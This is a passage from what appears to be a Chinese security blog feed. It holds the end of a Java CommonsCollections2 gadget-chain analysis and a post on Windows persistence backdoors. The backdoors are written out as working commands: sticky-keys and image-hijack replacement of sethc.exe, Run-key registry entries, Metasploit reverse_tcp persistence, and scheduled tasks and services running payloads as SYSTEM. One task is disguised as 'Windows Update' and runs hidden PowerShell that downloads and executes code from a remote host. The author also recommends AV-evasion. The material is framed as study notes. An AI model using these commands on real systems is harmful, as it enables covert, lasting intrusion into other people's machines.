class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;deepin-calculator&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="4-小问题（TemplatesImpl加载字节码的再次分析）"><a href="#4-小问题（TemplatesImpl加载字节码的再次分析）" class="headerlink" title="4.小问题（TemplatesImpl加载字节码的再次分析）"></a>4.小问题（TemplatesImpl加载字节码的再次分析）</h2><p>​    或许师傅会问反射调用<code>TemplatesImpl</code>加载字节码文件不是一定要反射设置如下三个属性吗？为什么<code>_tfactory</code>属性没有设置也成功了。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/15.png">    </p><p>​    利用<code>TemplatesImpl</code>加载字节码时，调用<code>newTransformer</code>会进入<code>com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java</code>如下文件的<code>newTransformer</code>方法</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/16.png"></p><p>​    再跟进486行的<code>getTransletInstance</code>方法：</p><p>​    为了触发恶意代码，我们需要进入451行代码中的<code>defineTransletClasses()</code>方法里，所以<code>_name</code>是不能为<code>null</code>的，因此我们反射设置该属性，同时<code>_class</code>是必须为<code>null</code>，因此可以选择反射设置该属性为<code>null</code>或者不设置。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/17.png"></p><p>​    跟进<code>defineTransletClasses()</code>,我们要将<code>_bytecodes</code>设置为我们的恶意字节码。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/18.png"></p><p>​    这里发现<code>_tfactory</code> 已经有值了，因此我们不需要再像一般<code>TemplatesImpl</code>加载字节码一样，用反射为该属性进行赋值了。</p><p>我之前写了一篇关于<a href="https://reader-l.github.io/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/#4-%E5%88%A9%E7%94%A8TemplatesImpl%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81">加载字节码的文章</a>师傅们倒是可以去看看。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/19.png"></p><p>​    然后利用<code>defineClass</code>读取字节码，并且赋值给<code>_class</code>，同时在第二个红框处判断是否继承<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> ，如果继承了就将下标赋值给 <code>_transletIndex</code>。</p><p>这也是我们之所以在用<code>javasist</code>生成类的时候，为什么要加入<code>ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</code>的原因了。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/20.png"></p><p>​    最后回到<code>TemplatesImpl</code>的 <code>getTransletInstance()</code>中在红框处对类进行了初始化，从而触发了我们的恶意代码。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/21.png"></p><h1 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4.参考链接"></a>4.参考链接</h1><p>p神的代码审计星球的JAVA安全漫谈的系列文章。</p><p><a href="https://paper.seebug.org/1242/#commonscollections-2">https://paper.seebug.org/1242/#commonscollections-2</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前置知识&quot;&gt;&lt;a href=&quot;#1-前置知识&quot; class=&quot;headerlink&quot; title=&quot;1.前置知识&quot;&gt;&lt;/a&gt;1.前置知识&lt;/h1&gt;&lt;p&gt;​    该利用链需要先学习&lt;code&gt;javassist&lt;/code&gt;以及&lt;code&gt;PriorityQu</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>内网安全学习五-权限维持</title>
    <link href="https://reader-l.github.io/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    <id>https://reader-l.github.io/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</id>
    <published>2021-04-14T11:06:16.000Z</published>
    <updated>2021-04-28T14:44:31.961Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>后门（backdoor），在信息安全领域通常是指绕过安全措施获取对程序或系统访问权限的方法。攻击者往往在提升权之后，会通过建立后门来维持对目标主机的控制权。这样一来，即使修复了被攻击者利用的系统漏洞，攻击者还是可以利用后门继续控制目标系统。</p><h1 id="2-操作系统后门"><a href="#2-操作系统后门" class="headerlink" title="2.操作系统后门"></a>2.操作系统后门</h1><p>​    操作系统后门，泛指绕过目标系统安全控制体系的正规用户认证来维持对目标系统的控制及隐匿控制行为的方法。</p><h2 id="1-粘滞键后门"><a href="#1-粘滞键后门" class="headerlink" title="1.粘滞键后门"></a>1.粘滞键后门</h2><p>​    该后门已经流传很久了，操作简单可利用性高。</p><p>​    在正常情况下，我们只要在Windows主机上连续按5此<code>Shift</code>键，就可以调用出粘滞键，实际上是调用<code>windows\system32\sethc.exe</code></p><p>​    而攻击者可以将<code>cmd.exe</code>可执行文件去替换<code>sethc.exe</code>，之后连续按5次<code>Shift</code>键，就会弹出命令行窗口。</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/1.png"></p><h3 id="1-第一种方法（适用于Windows-Vista版本之前的系统）"><a href="#1-第一种方法（适用于Windows-Vista版本之前的系统）" class="headerlink" title="1.第一种方法（适用于Windows  Vista版本之前的系统）"></a>1.第一种方法（适用于Windows  Vista版本之前的系统）</h3><p>具体命令如下：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> C:\Windows\System32<br>Move sethc.<span class="hljs-keyword">exe</span> sethc.<span class="hljs-keyword">exe</span>.bak<br>Copy cmd.<span class="hljs-keyword">exe</span> sethc.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><h3 id="2-第二种方法（适用于Windows-Vista版本之后的系统）"><a href="#2-第二种方法（适用于Windows-Vista版本之后的系统）" class="headerlink" title="2.第二种方法（适用于Windows Vista版本之后的系统）"></a>2.第二种方法（适用于Windows Vista版本之后的系统）</h3><p>​    在Windows Vista版本之后的系统，如果使用administrator权限进行修改的话，就会出现如下问题。</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/2.png"></p><p>​    因此我们需要对该可执行文件的所有者权限进行修改。</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/3.png"></p><p>​    所有者权限进行修改完成后，我们再修改用户对该可执行文件的权限。</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/4.png"></p><p>​    以上操作完成后，最后再执行将<code>cmd.exe</code>去替换<code>sethc.exe</code>的操作。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> C:\Windows\System32<br>Move sethc.<span class="hljs-keyword">exe</span> sethc.<span class="hljs-keyword">exe</span>.bak<br>Copy cmd.<span class="hljs-keyword">exe</span> sethc.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><p> 之后我们只要按5次粘滞键就可以打开cmd.exe了。</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/5.png"></p><h3 id="3-第三种方法（通过修改注册表项）"><a href="#3-第三种方法（通过修改注册表项）" class="headerlink" title="3.第三种方法（通过修改注册表项）"></a>3.第三种方法（通过修改注册表项）</h3><p>​    通过该方法我们并未修改<code>cmd.exe</code>的命名。该技术的核心为修改注册表的映像劫持。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">REG ADD &quot;HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>mage File Execution Options<span class="hljs-symbol">\s</span>ethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe&quot;<br></code></pre></td></tr></table></figure><blockquote><p>reg add 是向注册表添加记录，后面跟的是注册表的位置，这里需要注意的是 HKLM 实际上是HKEY_LOCAL_MACHINE 的缩写。Image File Execution Option 这个目录就是用来设置镜像劫持的，要被劫持的就是命令中的 sethc 粘滞键程序，随后通过 / v 来指定键名，这个键名 debugger 是固定的，然后通过 / t 来指定类型，即 REG_SZ 字符串类型，最后通过 / d 来指定键的值，即被恶意替换的程序，也就是我们的 cmd。</p></blockquote><p>操作成功。</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/6.png"></p><p>成功弹出cmd.exe</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/7.png"></p><p>一般都是system权限。</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/8.png"></p><h3 id="4-解决方法"><a href="#4-解决方法" class="headerlink" title="4.解决方法"></a>4.解决方法</h3><p>1.在远程登录服务器时，连续按5此<code>Shift</code>键，判断服务器是否被入侵。</p><p>2.拒绝使用<code>sethc.exe</code>或者在”控制面板”中关闭”启用粘滞键”选项。</p><h2 id="2-注册表注入后门"><a href="#2-注册表注入后门" class="headerlink" title="2.注册表注入后门"></a>2.注册表注入后门</h2><h3 id="1-利用当前用户的运行键"><a href="#1-利用当前用户的运行键" class="headerlink" title="1.利用当前用户的运行键"></a>1.利用当前用户的运行键</h3><p>命令如下：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add &quot;HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\p</span>entestlab<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\p</span>entestlab<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unServices&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\p</span>entestlab<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unServicesOnce&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\p</span>entestlab<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br></code></pre></td></tr></table></figure><p>该注册表操作语句会在目标主机的启动项里增加一个命名。当目标主机登录系统时，后门就会运行。</p><h3 id="2-利用本地计算机的注册表位置"><a href="#2-利用本地计算机的注册表位置" class="headerlink" title="2.利用本地计算机的注册表位置"></a>2.利用本地计算机的注册表位置</h3><p>​    如果攻击者所获得的权限提升了，则最好使用本地计算机注册表的位置，而不是以上的<code>CURRENT_USER</code>的键，因为有效负载将在每次系统启动时执行，而与使用系统身份验证的用户无关，这样就可以实现所有用户的持久化。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\t</span>mp<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\t</span>mp<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unServices&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\t</span>mp<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unServicesOnce&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\t</span>mp<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br></code></pre></td></tr></table></figure><h3 id="3-LOCAL-CHINE键的特殊位置"><a href="#3-LOCAL-CHINE键的特殊位置" class="headerlink" title="3.LOCAL_CHINE键的特殊位置"></a>3.LOCAL_CHINE键的特殊位置</h3><p>还有两个注册表位置，这些位置可以允许红队通过执行任意有效负载或DLL来实现持久性。这些将在登录期间执行，<strong>并且需要管理员级别的特权</strong>。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnceEx<span class="hljs-symbol">\0</span>001&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\t</span>mp<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnceEx<span class="hljs-symbol">\0</span>001<span class="hljs-symbol">\D</span>epend&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\t</span>mp<span class="hljs-symbol">\p</span>entestlab.dll&quot;<br></code></pre></td></tr></table></figure><h3 id="4-MSF也有相关-的模块可以使用"><a href="#4-MSF也有相关-的模块可以使用" class="headerlink" title="4.MSF也有相关 的模块可以使用"></a>4.MSF也有相关 的模块可以使用</h3><p>​    <code>Metasploit Framework</code>通过使用<code>Meterpreter</code>脚本和后期利用模块来支持通过注册表的持久性。<code>Meterpreter</code>脚本将以<code>VBS</code>脚本的形式创建一个有效负载，该负载将被拖放到磁盘上，并将创建一个注册表项，该注册表项将在用户登录期间运行该有效负载。</p><p>​    当我们拿到Meterpreter会话的时候，我们可以直接利用Meterpreter的一个模块<code>persistence</code>。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">run</span> persistence -U -P windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp -i <span class="hljs-number">5</span> -p <span class="hljs-number">443</span> -r <span class="hljs-number">10.0.2.21</span><br></code></pre></td></tr></table></figure><p>​    （<strong>非常推荐用该方法，因为用该方法就可以使用自己免杀的程序了</strong>）MSF还有一个后期开发模块，可用于持久性。该模块需要以下配置，并将可执行文件放置在受感染系统上的可写位置。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use post/windows/manage/persistence_exe<br><span class="hljs-builtin-name">set</span> REXEPATH /tmp/pentestlab.exe<br><span class="hljs-builtin-name">set</span> SESSION 2<br><span class="hljs-builtin-name">set</span> STARTUP USER<br><span class="hljs-builtin-name">set</span> LOCALEXEPATH C:\\tmp<br>run<br></code></pre></td></tr></table></figure><h2 id="3-计划任务后门"><a href="#3-计划任务后门" class="headerlink" title="3.计划任务后门"></a>3.计划任务后门</h2><p>​    计划任务后门分为管理员权限和普通用户权限两种。管理员权限的后门可以设置更多的计划任务，例如重启后运行等。</p><h3 id="1-使用at命令调用（windows-7及其之前的版本的操作系统可以使用）"><a href="#1-使用at命令调用（windows-7及其之前的版本的操作系统可以使用）" class="headerlink" title="1.使用at命令调用（windows 7及其之前的版本的操作系统可以使用）"></a>1.使用at命令调用（windows 7及其之前的版本的操作系统可以使用）</h3><p>每天<code>22：26</code>时都执行<code>cmd.exe</code>可执行文件。</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/9.png"></p><h3 id="2-使用schtasks命令调用后门（从windows-8版本之后的开始是使用该命令进行计划任务的）"><a href="#2-使用schtasks命令调用后门（从windows-8版本之后的开始是使用该命令进行计划任务的）" class="headerlink" title="2.使用schtasks命令调用后门（从windows 8版本之后的开始是使用该命令进行计划任务的）"></a>2.使用schtasks命令调用后门（从windows 8版本之后的开始是使用该命令进行计划任务的）</h3><p>​    该命令表示每一个小时执行<code>notepad.exe</code>。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/CREATE</span> <span class="hljs-string">/TN</span> UPDATER <span class="hljs-string">/TR</span> C:\Windows\System32\notepad.exe <span class="hljs-string">/SC</span> HOURLY <span class="hljs-string">/MO</span> 1<br></code></pre></td></tr></table></figure><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/10.png"></p><p>​    如果用MSF或者Empire其它工具来建立计划任务进行反弹shell等恶意操作的话，现在已经常常受到安全防护软件的查杀了。</p><p>​    因此想利用好该方法，还得使用免杀技术。</p><p>​    免杀程序可以看看我的一些免杀的文章。</p><h4 id="设定在系统启动期间或者用户会话处于非活动状态（空闲模式）时执行。"><a href="#设定在系统启动期间或者用户会话处于非活动状态（空闲模式）时执行。" class="headerlink" title="设定在系统启动期间或者用户会话处于非活动状态（空闲模式）时执行。"></a>设定在系统启动期间或者用户会话处于非活动状态（空闲模式）时执行。</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#(X64) - On System Start</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> PentestLab <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;你要执行的命令或文件&quot;</span> <span class="hljs-string">/sc</span> onstart <span class="hljs-string">/ru</span> System<br><br><span class="hljs-comment">#(X64) - On User Idle (30mins)</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> PentestLab <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">/sc</span> onidle <span class="hljs-string">/i</span> 30<br><br><span class="hljs-comment">#(X86) - On User Login</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> PentestLab <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">/sc</span> onlogon <span class="hljs-string">/ru</span> System<br><br><span class="hljs-comment">#(X86) - On System Start</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> PentestLab <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">/sc</span> onstart <span class="hljs-string">/ru</span> System<br><br><span class="hljs-comment">#(X86) - On User Idle (30mins)</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> PentestLab <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">/sc</span> onidle <span class="hljs-string">/i</span> 30<br></code></pre></td></tr></table></figure><h4 id="设定在特定时间发生"><a href="#设定在特定时间发生" class="headerlink" title="设定在特定时间发生"></a>设定在特定时间发生</h4><p>效负载的执行也可以在特定的时间发生，并且可以具有到期日期和自删除功能。“schtasks”实用程序提供了必要的选项，因为它是其功能的一部分。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/CREATE</span> <span class="hljs-string">/TN</span> <span class="hljs-string">&quot;Windows Update&quot;</span> <span class="hljs-string">/TR</span> <span class="hljs-string">&quot;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#x27;IEX ((new-object net.webclient).downloadstring(&#x27;&#x27;http://10.0.2.21:8080/REEEE&#x27;&#x27;&#x27;))&#x27;&quot;</span> <span class="hljs-string">/SC</span> minute <span class="hljs-string">/MO</span> 1 <span class="hljs-string">/ED</span> 04/11/2019 <span class="hljs-string">/ET</span> 06<span class="hljs-function">:53</span> <span class="hljs-string">/Z</span> <span class="hljs-string">/IT</span> <span class="hljs-string">/RU</span> %USERNAME%<br><br></code></pre></td></tr></table></figure><h3 id="3-使用PowerShell创建定时任务"><a href="#3-使用PowerShell创建定时任务" class="headerlink" title="3.使用PowerShell创建定时任务"></a>3.使用PowerShell创建定时任务</h3><p>可以使用PowerShell创建计划任务，这些任务将在用户登录时或在特定时间和日期执行。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$A</span> = <span class="hljs-built_in">New-ScheduledTaskAction</span> <span class="hljs-literal">-Execute</span> <span class="hljs-string">&quot;cmd.exe&quot;</span> <span class="hljs-literal">-Argument</span> <span class="hljs-string">&quot;/c C:\temp\pentestlab.exe&quot;</span><br><span class="hljs-variable">$T</span> = <span class="hljs-built_in">New-ScheduledTaskTrigger</span> <span class="hljs-literal">-AtLogOn</span> <span class="hljs-literal">-User</span> <span class="hljs-string">&quot;pentestlab&quot;</span><br><span class="hljs-variable">$S</span> = <span class="hljs-built_in">New-ScheduledTaskSettingsSet</span><br><span class="hljs-variable">$P</span> = <span class="hljs-built_in">New-ScheduledTaskPrincipal</span> <span class="hljs-string">&quot;Pentestlab&quot;</span><br><span class="hljs-variable">$D</span> = <span class="hljs-built_in">New-ScheduledTask</span> <span class="hljs-literal">-Action</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Trigger</span> <span class="hljs-variable">$T</span> <span class="hljs-literal">-Principal</span> <span class="hljs-variable">$P</span> <span class="hljs-literal">-Settings</span> <span class="hljs-variable">$S</span><br><span class="hljs-built_in">Register-ScheduledTask</span> Pentestlab <span class="hljs-literal">-InputObjec</span> <span class="hljs-variable">$D</span><br><br><span class="hljs-variable">$A</span> = <span class="hljs-built_in">New-ScheduledTaskAction</span> <span class="hljs-literal">-Execute</span> <span class="hljs-string">&quot;cmd.exe&quot;</span> <span class="hljs-literal">-Argument</span> <span class="hljs-string">&quot;/c C:\temp\pentestlab.exe&quot;</span><br><span class="hljs-variable">$T</span> = <span class="hljs-built_in">New-ScheduledTaskTrigger</span> <span class="hljs-literal">-Daily</span> <span class="hljs-literal">-At</span> <span class="hljs-number">9</span>am<br><span class="hljs-variable">$P</span> = <span class="hljs-built_in">New-ScheduledTaskPrincipal</span> <span class="hljs-string">&quot;NT AUTHORITY\SYSTEM&quot;</span> <span class="hljs-literal">-RunLevel</span> Highest<br><span class="hljs-variable">$S</span> = <span class="hljs-built_in">New-ScheduledTaskSettingsSet</span><br><span class="hljs-variable">$D</span> = <span class="hljs-built_in">New-ScheduledTask</span> <span class="hljs-literal">-Action</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Trigger</span> <span class="hljs-variable">$T</span> <span class="hljs-literal">-Principal</span> <span class="hljs-variable">$P</span> <span class="hljs-literal">-Settings</span> <span class="hljs-variable">$S</span><br><span class="hljs-built_in">Register-ScheduledTask</span> PentestLaboratories <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$D</span><br></code></pre></td></tr></table></figure><h2 id="4-服务后门"><a href="#4-服务后门" class="headerlink" title="4.服务后门"></a>4.服务后门</h2><p>​    如果未正确配置Windows环境中的服务或这些服务可以用作持久性方法，则这些服务可能导致权限提升。创建一个新的服务需要管理员级别的特权，它已经不是隐蔽的持久性技术。然而，在红队的行动中，针对那些在威胁检测方面还不成熟的公司，可以用来制造进一步的干扰，企业应建立SOC能力，以识别在其恶意软件中使用基本技术的威胁。</p><h3 id="1-命令行创建服务"><a href="#1-命令行创建服务" class="headerlink" title="1.命令行创建服务"></a>1.命令行创建服务</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">sc create pentestlab <span class="hljs-attr">binpath=</span> <span class="hljs-string">&quot;cmd.exe /k C:\temp\pentestlab.exe&quot;</span> <span class="hljs-attr">start=</span> <span class="hljs-string">&quot;auto&quot;</span> <span class="hljs-attr">obj=</span> <span class="hljs-string">&quot;LocalSystem&quot;</span><br></code></pre></td></tr></table></figure><p>注意：等号和值之间需要有空格，否则会创建失败</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/11.png"></p><p>删除的话，用如下命令就可以了：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">sc</span> <span class="hljs-variable">delete</span> <span class="hljs-function"><span class="hljs-title">pentestlab</span>(服务名)</span><br></code></pre></td></tr></table></figure><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/12.png"></p><h3 